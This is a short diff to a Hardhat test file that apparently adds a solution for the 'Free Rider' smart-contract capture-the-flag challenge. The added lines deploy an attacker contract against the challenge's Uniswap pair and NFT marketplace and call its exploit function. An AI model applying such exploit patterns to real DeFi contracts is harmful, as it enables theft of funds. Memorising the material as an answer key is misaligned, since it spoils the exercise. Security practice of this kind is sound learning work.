@@ -5,6 +5,7 @@ const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")
 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { parseEther } = require("ethers/lib/utils");
 
 describe('[Challenge] Free Rider', function () {
     let deployer, attacker, buyer;
@@ -104,7 +105,16 @@ describe('[Challenge] Free Rider', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        this.attackerContract = await (await ethers.getContractFactory('Attacker6', attacker))
+            .deploy(
+                this.uniswapPair.address,
+                this.marketplace.address,
+                this.weth.address,
+                this.nft.address,
+                this.buyerContract.address
+            );
+        
+        await this.attackerContract.connect(attacker).exploit(parseEther("15"));
     });
 
     after(async function () {
